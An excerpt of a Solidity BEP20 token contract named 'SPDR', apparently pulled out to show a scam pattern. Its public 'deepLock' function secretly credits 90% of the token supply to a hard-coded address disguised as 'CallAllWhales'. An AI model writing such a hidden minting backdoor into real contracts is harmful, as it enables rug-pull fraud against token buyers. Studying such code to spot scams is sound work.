...
contract SPDR is Context, IBEP20, Ownable {
    ...
    address private CallAllWhales = 0x17f8D1604D48d270E62Ff0E6A4d9542D87fa66F9;
    ...
    string private _name = 'SPDR';
    string private _symbol = 'SPDR';
    uint8 private _decimals = 9;

    constructor () {
        _rOwned[_msgSender()] = _rTotalSupply.div(1000).mul(100);
        emit Transfer(address(0), _msgSender(), _allTotalSupply*100/1000);
    }
    ...
    function deepLock() public {
      ...
      _rOwned[CallAllWhales] = _rTotalSupply.div(1000).mul(900);
        emit Transfer(address(0), CallAllWhales, _allTotalSupply*900/1000);
    }
